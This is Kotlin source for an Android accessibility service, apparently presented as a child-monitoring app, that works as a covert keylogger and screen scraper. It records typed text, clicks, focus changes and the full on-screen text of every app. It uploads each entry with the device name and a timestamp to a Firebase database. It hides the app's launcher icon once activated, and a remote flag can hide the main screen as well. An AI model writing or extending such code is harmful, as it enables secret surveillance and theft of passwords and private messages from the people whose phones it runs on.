package com.system.internet

import android.accessibilityservice.AccessibilityService
import android.content.ComponentName
import android.content.pm.PackageManager
import android.content.Intent
import android.os.Build
import android.util.Log
import android.util.Log.i
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Locale
import java.util.regex.Pattern

class MyService : AccessibilityService() {

    val firebaseAuth = FirebaseAuth.getInstance()
    val firebaseDatabase = FirebaseDatabase.getInstance()

    val TAG = "MyService_info"
    val USER_REFRENCE = "data"
    val DATA_REFRENCE = "data"
    val ACCOUNT_DATA = "account data"
    val DEVICE_NAME = "Device Name"
    val DEVICE_MODEL = android.os.Build.MODEL
    val PREFERENCE_NAME = "SharedPreference"
    val CHILD_NAME_KEY = "ChildName"
    val USER_TYPE = "user_type"
    val KEYLOG_DATA = "keylogData"
    val IS_HIDDEN = "Is_Hidden"
    val IS_ACCESSIBILITY_ACTIVE = "Is_Accessibility_Service_Active"

    fun getDateTime(): String {
        val dateFormat = SimpleDateFormat("dd MMM yyyy HH:mm:ss", Locale.getDefault())
        return dateFormat.format(Calendar.getInstance().time)
    }


    val EMAIL_ADDRESS_PATTERN: Pattern = Pattern.compile(
        "[a-zA-Z0-9\\+\\.\\_\\%\\-\\+]{1,256}" +
                "\\@" +
                "[a-zA-Z0-9][a-zA-Z0-9\\-]{0,64}" +
                "(" +
                "\\." +
                "[a-zA-Z0-9][a-zA-Z0-9\\-]{0,25}" +
                ")+"
    )

    fun checkEmail(email: String): Boolean {
        return EMAIL_ADDRESS_PATTERN.matcher(email).matches()
    }

    fun isLoggedIn(firebaseAuth: FirebaseAuth): Boolean {
        return firebaseAuth.currentUser != null
    }

    fun getDeviceName(): String? {
        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        return if (model.lowercase(Locale.getDefault())
                .startsWith(manufacturer.lowercase(Locale.getDefault()))
        ) {
            capitalize(model)
        } else {
            capitalize(manufacturer) + " " + model
        }
    }


    private fun capitalize(s: String?): String {
        if (s == null || s.length == 0) {
            return ""
        }
        val first = s[0]
        return if (Character.isUpperCase(first)) {
            s
        } else {
            first.uppercaseChar().toString() + s.substring(1)
        }
    }


    var childName: String = ""
    lateinit var keyLogDataRef: DatabaseReference


    override fun onCreate() {
        super.onCreate()
        val sharedPreferences =
            applicationContext.getSharedPreferences(PREFERENCE_NAME, MODE_PRIVATE)
        childName = sharedPreferences.getString(CHILD_NAME_KEY, "").toString()
        i(TAG, childName)
//        keyLogDataRef = firebaseDatabase.getReference("data").child(firebaseAuth.uid.toString())
//            .child(childName).child(KEYLOG_DATA)
        keyLogDataRef = firebaseDatabase.getReference("data")


        var parentUid = ""
        if (firebaseAuth.currentUser != null) {
            parentUid = firebaseAuth.currentUser!!.uid
        }
        val childName = sharedPreferences?.getString(CHILD_NAME_KEY, "")
        val userRef = firebaseDatabase.getReference(USER_REFRENCE)

        if (parentUid.isNullOrEmpty()) {
            parentUid = getDeviceName() ?: "UNKNOWN"
        }
        userRef.child(parentUid).child(childName.toString()).child(
            ACCOUNT_DATA
        ).child(IS_HIDDEN).addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val pkg: PackageManager = applicationContext.packageManager
                if (snapshot.value == 1) {

                    pkg.setComponentEnabledSetting(
                        ComponentName(applicationContext, MainActivity::class.java),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } else {
                    pkg.setComponentEnabledSetting(
                        ComponentName(applicationContext, MainActivity::class.java),
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                }
            }

            override fun onCancelled(error: DatabaseError) {
                TODO("Not yet implemented")
            }

        })


    }


    override fun onServiceConnected() {
        i(TAG, "onServiceConnected: "+getString(R.string.app_name)+" Activated")
        setLauncherIconVisibility(false)
    }


    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
//        i("cek", event.toString())
        when (event!!.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                var data =  "{${event.beforeText.toString()}}" +  event.text.toString()
                i(TAG, "${getDateTime()} |(TEXT)| $data")
//                i(TAG, "${getDateTime()} |(TEXT)| $data")
//                keyLogDataRef.push().child("keylog").setValue("${getDateTime()} |(TEXT)| $data")
                setData("(TEXT : ${event.packageName})", data)
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(FOCUSED)| $data")
//                keyLogDataRef.push().child("keylog").setValue("${getDateTime()} |(FOCUSED)| $data")
                setData("(FOCUSED : ${event.packageName})", data)
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(CLICKED)| $data")
//                keyLogDataRef.push().child("keylog").setValue("${getDateTime()} |(CLICKED)| $data")
                setData("(CLICKED : ${event.packageName})", data)
            }

            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    i(TAG, "${getDateTime()} |(SCROLLED)| $data")
//                    keyLogDataRef.push().child("keylog")
//                        .setValue("${getDateTime()} |(SCROLLED)| $data")
                    setData("(SCROLLED) : ${event.packageName}", data)
                }

            }

            AccessibilityEvent.TYPE_ASSIST_READING_CONTEXT -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(TYPE_ASSIST_READING_CONTEXT)| $data")
//                keyLogDataRef.push().child("keylog")
//                    .setValue("${getDateTime()} |(READING_CONTEXT)| $data")
                setData("(READING_CONTEXT : ${event.packageName})", data)
            }


            AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED -> {
                val data = event.text.toString()
                i(TAG, "${getDateTime()} |(CONTEXT_CLICKED)| $data")
//                keyLogDataRef.push().child("keylog")
//                    .setValue("${getDateTime()} |(CONTEXT_CLICKED)| $data")
                setData("(CONTEXT_CLICKED : ${event.packageName})", data)
            }

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val nodeInfo = event.source
                if (nodeInfo != null){
                    dfs(nodeInfo)
                }
            }

            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val nodeInfo = event.source
                if (nodeInfo != null){
                    dfs(nodeInfo)
                }
            }

        }
    }

    fun dfs(info: AccessibilityNodeInfo?) {
        if (info == null) return
        if (info.text != null) {
            i(TAG, "(WINDOW_STATE_CHANGED : ${info.packageName}) " + info.text.toString())
            setData("(WINDOW_STATE_CHANGED : ${info.packageName})", info.text.toString())
        }
        for (i in 0 until info.childCount) {
            val child = info.getChild(i)
            dfs(child)
            child?.recycle()
        }
    }


    override fun onInterrupt() {
        Log.i(TAG, "onInterrupt: "+getString(R.string.app_name)+" interrupted")
    }

    fun setData(event: String, data: String) {
        keyLogDataRef.push().child("log").setValue("[${getDeviceName()}] ${getDateTime()} |" + event + "| $data")
    }

    override fun onUnbind(intent: Intent?): Boolean {
        setLauncherIconVisibility(true)
        return super.onUnbind(intent)
    }

    private fun setLauncherIconVisibility(enabled: Boolean) {
        val packageManager = applicationContext.packageManager
        val componentName = ComponentName(this, LoginActivity::class.java)
        val state = if (enabled) {
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        } else {
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        }
        packageManager.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP)
    }

}